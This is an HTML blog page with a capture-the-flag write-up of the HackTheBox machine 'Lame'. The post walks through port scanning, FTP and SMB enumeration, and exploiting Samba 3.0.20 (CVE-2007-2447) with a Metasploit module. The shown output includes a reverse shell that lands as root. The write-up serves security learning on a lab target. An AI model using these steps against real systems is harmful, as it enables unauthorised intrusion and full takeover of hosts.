<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> Writeup - HTB - Lame -Phil Malle </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Walkthrough of Lame from HacktheBox.- Writeup - HTB - Lame"> <meta name="keywords" content="Writeup - HTB - Lame, Phil Malle, walkthroughs,Security, ctf, smbmap, msfconsole, CVE-2007-2447, Lame, HackTheBox, HTB"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="Phil Malle" property="og:site_name" /> <meta content="Writeup - HTB - Lame" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Walkthrough of Lame from HacktheBox." property="og:description" /> <meta content="/blog/lame/" property="og:url" /> <meta content="2020-10-29T23:14:00+00:00" property="article:published_time" /> <meta content="/about/" property="article:author" /> <meta content="/assets/img/htb-images/lame-htb.png" property="og:image" /> <meta content="walkthroughs" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="Writeup - HTB - Lame" /> <meta name="twitter:url" content="/blog/lame/" /> <meta name="twitter:description" content="Walkthrough of Lame from HacktheBox." /> <link rel="stylesheet" href="/assets/css/main.css" /> <!-- <link rel="stylesheet" href="/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = '' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="/assets/js/search.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!-- (you can remove the below scripts but do buy me a coffee to show some support :) --> <!-- buy me a coffeee --> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="philmalle" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">Phil Malle</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="/about" >About Me</a > </li> <li class="nav-item"> <a class="nav-link" href="/gallery" >Achievements</a > </li> <li class="nav-item"> <a class="nav-link" href="/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="/contact" >Contact</a > </li> <li class="nav-item"> <a class="nav-link" href="/links" >Links</a > </li> <li class="nav-item"> <a class="nav-link" href="/pgp" >GNUPG-Public Key</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher() " type="checkbox" name="checkbox" /> </li> </ul> </nav> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">Writeup - HTB - Lame</h1> <h4 class="post-meta">Walkthrough of Lame from HacktheBox.</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="/blog/authors/fr3akazo1d">fr3akazo1d</a></span> </span > at <time datetime="2020-10-29 23:14:00 +0000" itemprop="datePublished" >Oct 29, 2020</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/lame/" ></span> <div class="post-categories"> Category : <a href="/blog/categories/walkthroughs" >walkthroughs</a > </div> </div> <div class="card-body" itemprop="articleBody"> <center> <img src="/assets/img/htb-images/lame-htb.png" alt="" /></center> <br /> <br /> <h1 id="general-information">General Information</h1> <table> <thead> <tr> <th>Platform</th> <th>Room</th> <th>Date</th> <th>Difficulty</th> <th>Tags</th> <th>Time</th> </tr> </thead> <tbody> <tr> <td>HackTheBox</td> <td>Lame</td> <td>29.10.2020</td> <td>Easy</td> <td>Security, ctf, smbmap, msfconsole, CVE-2007-2447, Lame, HackTheBox, HTB</td> <td>2h</td> </tr> </tbody> </table> <p>After a while i was back on HackTheBox. I started with the Beginner Track of HTB and Lame is the first box in this Track.</p> <h1 id="used-programs">Used Programs</h1> <table> <thead> <tr> <th>Program</th> <th>Command</th> </tr> </thead> <tbody> <tr> <td>namp</td> <td>nmap -sC -sV -oN nmap/initial lame.htb</td> </tr> <tr> <td>rustscan</td> <td>rustscan lame.htb –ulimit 5000 – -sC -sV -oN nmap/initial tee output</td> </tr> <tr> <td>ftp</td> <td>ftp lame.htb</td> </tr> <tr> <td>smbmap</td> <td>smbmap -H lame.htb</td> </tr> <tr> <td>msfconsole</td> <td>use exploit/samba/usermap_script</td> </tr> </tbody> </table> <h1 id="rustscan">RustScan</h1> <p>Rust Scan found 4 Open ports on the Target:</p> <table> <thead> <tr> <th>Open-Port</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td>21</td> <td>FTP-Service</td> </tr> <tr> <td>139</td> <td>SMB</td> </tr> <tr> <td>445</td> <td>SMB</td> </tr> <tr> <td>3632</td> <td>distccd v1</td> </tr> </tbody> </table> <h2 id="ruscan-output">Ruscan-Output</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/HTB/Boxes]
└─<span class="nv">$ </span>rustscan 10.10.10.3 <span class="nt">--ulimit</span> 5000 <span class="nt">--</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/initial | <span class="nb">tee </span>rustscan.txt 

     _____           _    _____
    |  __ <span class="se">\ </span>        | |  / ____|
    | |__<span class="o">)</span> |   _ ___| |_| <span class="o">(</span>___   ___ __ _ _ __
    |  _  / | | / __| __|<span class="se">\_</span>__ <span class="se">\ </span>/ __/ _<span class="sb">`</span> | <span class="s1">'_ \
    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |
    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|
    Faster nmap scanning with rust.

Automatically upping ulimit to 5000
Open 139
Open 445
Open 21
Open 3632
Starting nmap.
The Nmap command to be run is -sC -sV -oN nmap/initial -vvv -Pn -p 139,445,21,3632 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked '</span>up<span class="s1">' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-29 23:34 CET
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:34
Completed Parallel DNS resolution of 1 host. at 23:34, 0.08s elapsed
DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:34
Scanning 10.10.10.3 [4 ports]
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed Connect Scan at 23:34, 0.05s elapsed (4 total ports)
Initiating Service scan at 23:34
Scanning 4 services on 10.10.10.3
Completed Service scan at 23:34, 11.18s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.10.3.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:34
NSE: [ftp-bounce 10.10.10.3:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.82% done; ETC: 23:35 (0:00:00 remaining)
Completed NSE at 23:35, 40.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.39s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.050s latency).
Scanned at 2020-10-29 23:34:38 CET for 52s

PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: -3d01h47m30s, deviation: 2h49m43s, median: -3d03h47m31s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 48762/tcp): CLEAN (Timeout)
|   Check 3 (port 18141/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-10-26T14:47:20-04:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn'</span>t establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>

NSE: Script Post-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>52.47 seconds
</code></pre></div></div> <h1 id="enumerating-ftp">Enumerating FTP</h1> <p>Can connetct via anonymous login. But there are no usefull information on the FTP-Server.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/HTB/Boxes/Lame]
└─<span class="nv">$ </span>ftp <span class="nv">$ip</span>
Connected to 10.10.10.3.
220 <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
Name <span class="o">(</span>10.10.10.3:fr3akazo1d<span class="o">)</span>: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp&gt; 
</code></pre></div></div> <h1 id="enumerating-smb">Enumerating SMB</h1> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/HTB/Boxes]
└─<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.10.10.3                                                                                                                                                                                                                  1 ⨯
<span class="o">[</span>+] IP: 10.10.10.3:445  Name: lame.htb                                          
        Disk                                                    Permissions Comment
  <span class="nt">----</span>                                                    <span class="nt">-----------</span> <span class="nt">-------</span>
  print<span class="nv">$ </span>                                             NO ACCESS Printer Drivers
  tmp                                                 READ, WRITE oh noes!
  opt                                                 NO ACCESS 
  IPC<span class="nv">$ </span>                                               NO ACCESS IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
  ADMIN<span class="nv">$ </span>                                             NO ACCESS IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/HTB/Boxes]
└─<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.10.10.3 <span class="nt">-R</span>
<span class="o">[</span>+] IP: 10.10.10.3:445  Name: lame.htb                                          
        Disk                                                    Permissions Comment
  <span class="nt">----</span>                                                    <span class="nt">-----------</span> <span class="nt">-------</span>
  print<span class="nv">$ </span>                                             NO ACCESS Printer Drivers
  tmp                                                 READ, WRITE oh noes!
  .<span class="se">\t</span>mp<span class="se">\*</span>
  dr--r--r--                0 Mon Oct 26 20:00:55 2020  <span class="nb">.</span>
  dw--w--w--                0 Sun May 20 20:36:11 2012  ..
  dw--w--w--                0 Mon Oct 26 11:25:31 2020  orbit-makis
  dr--r--r--                0 Sun Oct 25 23:44:13 2020  .ICE-unix
  fw--w--w--                0 Sun Oct 25 23:45:17 2020  5139.jsvc_up
  dr--r--r--                0 Sun Oct 25 23:44:39 2020  .X11-unix
  dw--w--w--                0 Mon Oct 26 11:25:31 2020  gconfd-makis
  fw--w--w--               11 Sun Oct 25 23:44:39 2020  .X0-lock
  .<span class="se">\t</span>mp<span class="se">\.</span>X11-unix<span class="se">\*</span>
  dr--r--r--                0 Sun Oct 25 23:44:39 2020  <span class="nb">.</span>
  dr--r--r--                0 Mon Oct 26 20:00:55 2020  ..
  fr--r--r--                0 Sun Oct 25 23:44:39 2020  X0
  opt                                                 NO ACCESS 
  IPC<span class="nv">$ </span>                                               NO ACCESS IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
  ADMIN<span class="nv">$ </span>                                             NO ACCESS IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
</code></pre></div></div> <p>Used smbmap for enumerating SMB-Shares. The “tmp” directory is read and writeable.</p> <h2 id="checking-smb-vulnerability">checking SMB-Vulnerability</h2> <p>I have checked if the SMB-Version is vulnerabaly. Used namp with the command: –script smb-vuln*</p> <h1 id="enumerating-port-3632">Enumerating Port 3632</h1> <p>I tried to exploit Port 3632 with an Metasploit scirpt: distcc_exec</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
msf5 exploit<span class="o">(</span>unix/misc/distcc_exec<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span>-] 10.10.10.3:3632 - Exploit failed: An exploitation error occurred.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit completed, but no session was created.

</code></pre></div></div> <p>But it failed and i was not able to get access to the target. After some tries, i gave up at this port.</p> <p>Maybe Samba is the way in.</p> <h1 id="enumerating-samba-smbd-3020-debian">Enumerating Samba smbd 3.0.20-Debian</h1> <p>I pay attention to this version of Samba and tried to look if there is any vulnerabily for this.</p> <p>After some research i came accross follwing articel on ragid7: https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script</p> <p>There is a vulnerability in this version. You can bybass ther authentication without any username and password.</p> <p>CVE-Details: CVE-2007-2447</p> <p>And there is a Metasploit-Module to exploit this vulnerability</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 <span class="o">&gt;</span> use exploit/multi/samba/usermap_script
</code></pre></div></div> <p>Info Page of this module:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> info

       Name: Samba <span class="s2">"username map script"</span> Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License <span class="o">(</span>BSD<span class="o">)</span>
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck &lt;jduck@metasploit.com&gt;

Available targets:
  Id  Name
  <span class="nt">--</span>  <span class="nt">----</span>
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  <span class="nt">----</span>    <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
  RHOSTS                   <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
  RPORT   139              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>

Payload information:
  Space: 1024

Description:
  This module exploits a <span class="nb">command </span>execution vulnerability <span class="k">in </span>Samba 
  versions 3.0.20 through 3.0.25rc3 when using the non-default 
  <span class="s2">"username map script"</span> configuration option. By specifying a username 
  containing shell meta characters, attackers can execute arbitrary 
  commands. No authentication is needed to exploit this vulnerability 
  since this option is used to map usernames prior to authentication!

References:
  https://cvedetails.com/cve/CVE-2007-2447/
  OSVDB <span class="o">(</span>34700<span class="o">)</span>
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id<span class="o">=</span>534
  http://samba.org/samba/security/CVE-2007-2447.html
</code></pre></div></div> <h2 id="exploit">Exploit</h2> <p>For this exploit we only have to set the rhosts and run the exploit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.34:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.34:4444 -&gt; 10.10.10.3:34509<span class="o">)</span> at 2020-10-30 00:25:19 +0100

<span class="nb">id</span><span class="p">;</span><span class="nb">whoami
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root
</code></pre></div></div> <p>This exploit gave as root access to the Machine.</p> <p>Now we have root access we can check for the User.txt and the Root.txt file and submit it to HackTheBox.</p> <h1 id="conclusion">Conclusion</h1> <p>I have to say, i was clueless about the enumeration of the weakness of this box. I had a hint, on an writeup of this box, that Samba is the way in. So i have payed more attention to this section.</p> <p>This was my first Box with this kind of vulenrability. I have learnd some new skills about samba and how i can exploit this kind of version.</p> <p>Th4nks 4 R3ad1ng</p> <p>Fr3akazo1d</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="/blog/lame/" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About Fr3akazo1d! </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="/assets/img/authors/freakazoid.png" alt="Fr3akazo1d!" /> </div> <div class="col-md-6"> <p class="author_bio">Cyber-Security Entusiast, CTF-Player</p> <p>Email : fr3akazo1d@protonmail.com</p> <p>Website : https://fr3akazo1d.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/fr3akazo1d" target="_blank"><i class="fab fa-github fa-fw"></i></a> </p> </div> </div> </div> </div> </div> <!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <script> var disqus_config = function () { this.page.url = "/blog/lame/"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/HTB-Lame-Writeup"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About Phil Malle</div> <div class="card-body"> <p class="author_bio">Hi, my name is Phil Malle. This is my personal blog about technologies, Cyber-Security and other similar topics.</p><a class="github-button" href="https://github.com/PhilMalle/philmalle.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star PhilMalle/philmalle.github.io on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#walkthroughs"></div> <li class="tag-head"> <a href="/blog/categories/walkthroughs">walkthroughs</a> </li> <a name="walkthroughs"></a> <div id="#journey"></div> <li class="tag-head"> <a href="/blog/categories/journey">journey</a> </li> <a name="journey"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="/about">About Me</a> </li> <li> <a href="/gallery">Achievements</a> </li> <li> <a href="/blog">Blog</a> </li> <li> <a href="/contact">Contact</a> </li> <li> <a href="/links">Links</a> </li> <li> <a href="/pgp">GNUPG-Public Key</a> </li> </div> </div> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/sujaykundu777/devlopr-jekyll"> devlopr jekyll</a>.Hosted at <a href="https://pages.github.com">Github</a>. &copy; by Phil Malle 2021</p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> <!-- olvy releases --> <script> var OlvyConfig = { organisation: "", target: "#olvy-target", type: "sidebar", view: { showSearch: true, compact: true, showHeader: true, /* only applies when widget type is embed. you cannot hide header for modal and sidebar widgets */ showUnreadIndicator: true, unreadIndicatorColor: "#FFA13AFF", unreadIndicatorPosition: "top-right" } }; </script> <script type="text/javascript" src="https://app.olvy.co/script.js" defer="defer"></script> </body> </html>
